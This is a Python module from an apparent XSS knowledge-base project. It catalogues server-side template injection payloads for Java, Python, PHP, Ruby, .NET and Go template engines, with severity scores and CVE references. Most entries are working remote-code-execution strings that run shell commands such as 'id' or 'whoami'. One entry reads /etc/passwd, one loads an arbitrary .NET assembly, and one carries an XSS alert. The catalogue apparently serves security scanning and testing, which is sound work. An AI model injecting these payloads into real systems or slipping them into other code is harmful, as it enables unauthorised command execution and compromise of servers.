#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Production
Telegram: https://t.me/EasyProTech

Server-Side Template Injection (SSTI) - Enterprise Edition
Java (Thymeleaf, Spring EL, Freemarker, Velocity)
Python (Jinja2, Django, Mako, Tornado)
PHP (Twig, Blade, Smarty)
Ruby (ERB, Slim, Haml)
.NET (Razor)
"""

from ..models import PayloadEntry

SSTI_ENTERPRISE_PAYLOADS = {
    # === Java: Spring Expression Language (SpEL) ===
    "ssti_spel_runtime_exec": PayloadEntry(
        payload="${T(java.lang.Runtime).getRuntime().exec('id')}",
        contexts=["ssti", "java", "spring", "spel"],
        severity="critical",
        cvss_score=9.8,
        description="Spring EL Runtime.exec() for arbitrary OS command execution. Classic SpEL RCE vector.",
        tags=["ssti", "java", "spring", "spel", "rce", "runtime"],
        reliability="high",
        attack_surface="server",
        known_affected=["spring framework", "spring boot"],
        spec_ref="CVE-2022-22963"
    ),
    "ssti_spel_processbuilder": PayloadEntry(
        payload="${T(java.lang.ProcessBuilder).new({'cat','/etc/passwd'}).start()}",
        contexts=["ssti", "java", "spring", "spel"],
        severity="critical",
        cvss_score=9.8,
        description="Spring EL ProcessBuilder for command execution with argument control",
        tags=["ssti", "java", "spring", "spel", "rce", "processbuilder"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_spel_scriptengine": PayloadEntry(
        payload="${T(javax.script.ScriptEngineManager).new().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
        contexts=["ssti", "java", "spring", "spel"],
        severity="critical",
        cvss_score=9.8,
        description="Spring EL via JavaScript ScriptEngine for polyglot RCE",
        tags=["ssti", "java", "spring", "spel", "rce", "scriptengine", "javascript"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_spel_detection": PayloadEntry(
        payload="${7*7}",
        contexts=["ssti", "java", "spring", "spel"],
        severity="medium",
        cvss_score=5.0,
        description="Spring EL arithmetic detection payload - returns 49 if vulnerable",
        tags=["ssti", "java", "spring", "spel", "detection"],
        reliability="high",
        attack_surface="server"
    ),

    # === Java: Thymeleaf ===
    "ssti_thymeleaf_preprocessor": PayloadEntry(
        payload="__${T(java.lang.Runtime).getRuntime().exec('whoami')}__::.x",
        contexts=["ssti", "java", "thymeleaf"],
        severity="critical",
        cvss_score=9.8,
        description="Thymeleaf preprocessor expression for RCE via __${...}__::. syntax",
        tags=["ssti", "java", "thymeleaf", "rce", "preprocessor"],
        reliability="high",
        attack_surface="server",
        known_affected=["thymeleaf < 3.0.12"],
        spec_ref="CVE-2020-9296"
    ),
    "ssti_thymeleaf_fragment": PayloadEntry(
        payload="~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__}",
        contexts=["ssti", "java", "thymeleaf"],
        severity="critical",
        cvss_score=9.8,
        description="Thymeleaf fragment expression with command output capture",
        tags=["ssti", "java", "thymeleaf", "rce", "fragment"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_thymeleaf_ioutils": PayloadEntry(
        payload="*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        contexts=["ssti", "java", "thymeleaf"],
        severity="critical",
        cvss_score=9.8,
        description="Thymeleaf with Apache Commons IOUtils for command output reading",
        tags=["ssti", "java", "thymeleaf", "rce", "ioutils"],
        reliability="high",
        attack_surface="server"
    ),

    # === Java: Freemarker ===
    "ssti_freemarker_execute": PayloadEntry(
        payload='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        contexts=["ssti", "java", "freemarker"],
        severity="critical",
        cvss_score=9.8,
        description="Freemarker Execute utility class for arbitrary command execution",
        tags=["ssti", "java", "freemarker", "rce", "execute"],
        reliability="high",
        attack_surface="server",
        known_affected=["freemarker"]
    ),
    "ssti_freemarker_objectconstructor": PayloadEntry(
        payload='<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>${oc("java.lang.ProcessBuilder","id").start()}',
        contexts=["ssti", "java", "freemarker"],
        severity="critical",
        cvss_score=9.8,
        description="Freemarker ObjectConstructor for ProcessBuilder instantiation",
        tags=["ssti", "java", "freemarker", "rce", "objectconstructor"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_freemarker_detection": PayloadEntry(
        payload="${7*7}",
        contexts=["ssti", "java", "freemarker"],
        severity="medium",
        cvss_score=5.0,
        description="Freemarker arithmetic detection payload",
        tags=["ssti", "java", "freemarker", "detection"],
        reliability="high",
        attack_surface="server"
    ),

    # === Java: Velocity ===
    "ssti_velocity_runtime": PayloadEntry(
        payload='#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',
        contexts=["ssti", "java", "velocity"],
        severity="critical",
        cvss_score=9.8,
        description="Apache Velocity reflection chain for Runtime.exec() RCE",
        tags=["ssti", "java", "velocity", "rce", "reflection"],
        reliability="high",
        attack_surface="server",
        known_affected=["apache velocity"]
    ),
    "ssti_velocity_classloader": PayloadEntry(
        payload='#set($cl=$class.inspect("java.lang.Class").type)#set($rt=$cl.forName("java.lang.Runtime"))#set($m=$rt.getMethod("getRuntime"))#set($r=$m.invoke(null))$r.exec("id")',
        contexts=["ssti", "java", "velocity"],
        severity="critical",
        cvss_score=9.8,
        description="Velocity ClassLoader chain for RCE via reflection",
        tags=["ssti", "java", "velocity", "rce", "classloader"],
        reliability="high",
        attack_surface="server"
    ),

    # === Python: Jinja2 ===
    "ssti_jinja2_subclasses": PayloadEntry(
        payload="{{''.__class__.__mro__[1].__subclasses__()}}",
        contexts=["ssti", "python", "jinja2"],
        severity="high",
        cvss_score=8.0,
        description="Jinja2 subclasses enumeration for gadget discovery",
        tags=["ssti", "python", "jinja2", "subclasses", "recon"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_jinja2_popen": PayloadEntry(
        payload="{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
        contexts=["ssti", "python", "jinja2"],
        severity="critical",
        cvss_score=9.8,
        description="Jinja2 RCE via warnings module builtins access and os.popen()",
        tags=["ssti", "python", "jinja2", "rce", "popen"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_jinja2_config": PayloadEntry(
        payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        contexts=["ssti", "python", "jinja2", "flask"],
        severity="critical",
        cvss_score=9.8,
        description="Jinja2/Flask config object globals access for os.popen() RCE",
        tags=["ssti", "python", "jinja2", "flask", "rce", "config"],
        reliability="high",
        attack_surface="server",
        known_affected=["flask"]
    ),
    "ssti_jinja2_request": PayloadEntry(
        payload="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        contexts=["ssti", "python", "jinja2", "flask"],
        severity="critical",
        cvss_score=9.8,
        description="Jinja2/Flask request object chain for RCE",
        tags=["ssti", "python", "jinja2", "flask", "rce", "request"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_jinja2_lipsum": PayloadEntry(
        payload="{{lipsum.__globals__['os'].popen('id').read()}}",
        contexts=["ssti", "python", "jinja2"],
        severity="critical",
        cvss_score=9.8,
        description="Jinja2 lipsum global function for os module access",
        tags=["ssti", "python", "jinja2", "rce", "lipsum"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_jinja2_detection": PayloadEntry(
        payload="{{7*'7'}}",
        contexts=["ssti", "python", "jinja2"],
        severity="medium",
        cvss_score=5.0,
        description="Jinja2 detection payload - returns '7777777' if vulnerable",
        tags=["ssti", "python", "jinja2", "detection"],
        reliability="high",
        attack_surface="server"
    ),

    # === Python: Mako ===
    "ssti_mako_import": PayloadEntry(
        payload="<%import os%>${os.popen('id').read()}",
        contexts=["ssti", "python", "mako"],
        severity="critical",
        cvss_score=9.8,
        description="Mako template direct Python import for os.popen() RCE",
        tags=["ssti", "python", "mako", "rce", "import"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_mako_module": PayloadEntry(
        payload="${self.module.cache.util.os.popen('id').read()}",
        contexts=["ssti", "python", "mako"],
        severity="critical",
        cvss_score=9.8,
        description="Mako self.module chain for os access and RCE",
        tags=["ssti", "python", "mako", "rce", "module"],
        reliability="high",
        attack_surface="server"
    ),

    # === Python: Tornado ===
    "ssti_tornado_import": PayloadEntry(
        payload="{% import os %}{{ os.popen('id').read() }}",
        contexts=["ssti", "python", "tornado"],
        severity="critical",
        cvss_score=9.8,
        description="Tornado template import statement for direct RCE",
        tags=["ssti", "python", "tornado", "rce", "import"],
        reliability="high",
        attack_surface="server"
    ),

    # === PHP: Twig ===
    "ssti_twig_filter": PayloadEntry(
        payload="{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        contexts=["ssti", "php", "twig"],
        severity="critical",
        cvss_score=9.8,
        description="Twig registerUndefinedFilterCallback for exec() RCE",
        tags=["ssti", "php", "twig", "rce", "filter"],
        reliability="high",
        attack_surface="server",
        known_affected=["twig < 2.4.4"]
    ),
    "ssti_twig_system": PayloadEntry(
        payload="{{['id']|filter('system')}}",
        contexts=["ssti", "php", "twig"],
        severity="critical",
        cvss_score=9.8,
        description="Twig filter with system() callback for command execution",
        tags=["ssti", "php", "twig", "rce", "system"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_twig_detection": PayloadEntry(
        payload="{{7*7}}",
        contexts=["ssti", "php", "twig"],
        severity="medium",
        cvss_score=5.0,
        description="Twig arithmetic detection payload",
        tags=["ssti", "php", "twig", "detection"],
        reliability="high",
        attack_surface="server"
    ),

    # === PHP: Smarty ===
    "ssti_smarty_php": PayloadEntry(
        payload="{php}system('id');{/php}",
        contexts=["ssti", "php", "smarty"],
        severity="critical",
        cvss_score=9.8,
        description="Smarty {php} tag for direct PHP code execution (legacy versions)",
        tags=["ssti", "php", "smarty", "rce", "php-tag"],
        reliability="high",
        attack_surface="server",
        known_affected=["smarty < 3.1"]
    ),
    "ssti_smarty_literal": PayloadEntry(
        payload="{literal}<script>alert(1)</script>{/literal}",
        contexts=["ssti", "php", "smarty"],
        severity="high",
        cvss_score=7.5,
        description="Smarty literal block for XSS bypass",
        tags=["ssti", "php", "smarty", "xss", "literal"],
        reliability="high",
        attack_surface="server"
    ),

    # === Ruby: ERB ===
    "ssti_erb_system": PayloadEntry(
        payload="<%= system('id') %>",
        contexts=["ssti", "ruby", "erb"],
        severity="critical",
        cvss_score=9.8,
        description="ERB system() call for arbitrary command execution",
        tags=["ssti", "ruby", "erb", "rce", "system"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_erb_backticks": PayloadEntry(
        payload="<%= `id` %>",
        contexts=["ssti", "ruby", "erb"],
        severity="critical",
        cvss_score=9.8,
        description="ERB backtick command execution",
        tags=["ssti", "ruby", "erb", "rce", "backticks"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_erb_io_popen": PayloadEntry(
        payload="<%= IO.popen('id').read %>",
        contexts=["ssti", "ruby", "erb"],
        severity="critical",
        cvss_score=9.8,
        description="ERB IO.popen for command execution with output capture",
        tags=["ssti", "ruby", "erb", "rce", "io-popen"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_erb_detection": PayloadEntry(
        payload="<%= 7*7 %>",
        contexts=["ssti", "ruby", "erb"],
        severity="medium",
        cvss_score=5.0,
        description="ERB arithmetic detection payload",
        tags=["ssti", "ruby", "erb", "detection"],
        reliability="high",
        attack_surface="server"
    ),

    # === Ruby: Slim ===
    "ssti_slim_ruby": PayloadEntry(
        payload="= system('id')",
        contexts=["ssti", "ruby", "slim"],
        severity="critical",
        cvss_score=9.8,
        description="Slim template Ruby code execution via = output",
        tags=["ssti", "ruby", "slim", "rce"],
        reliability="high",
        attack_surface="server"
    ),

    # === .NET: Razor ===
    "ssti_razor_process": PayloadEntry(
        payload="@{System.Diagnostics.Process.Start(\"cmd\", \"/c id\");}",
        contexts=["ssti", "dotnet", "razor"],
        severity="critical",
        cvss_score=9.8,
        description="Razor Process.Start for arbitrary command execution",
        tags=["ssti", "dotnet", "razor", "rce", "process"],
        reliability="high",
        attack_surface="server"
    ),
    "ssti_razor_assembly": PayloadEntry(
        payload="@System.Reflection.Assembly.Load(System.Convert.FromBase64String(\"...\"))",
        contexts=["ssti", "dotnet", "razor"],
        severity="critical",
        cvss_score=9.8,
        description="Razor Assembly.Load for arbitrary .NET assembly execution",
        tags=["ssti", "dotnet", "razor", "rce", "assembly"],
        reliability="high",
        attack_surface="server"
    ),

    # === Go: text/template ===
    "ssti_go_template": PayloadEntry(
        payload="{{.}}",
        contexts=["ssti", "go", "template"],
        severity="medium",
        cvss_score=5.0,
        description="Go text/template context dump for information disclosure",
        tags=["ssti", "go", "template", "info-disclosure"],
        reliability="high",
        attack_surface="server"
    ),
}

SSTI_ENTERPRISE_TOTAL = len(SSTI_ENTERPRISE_PAYLOADS)
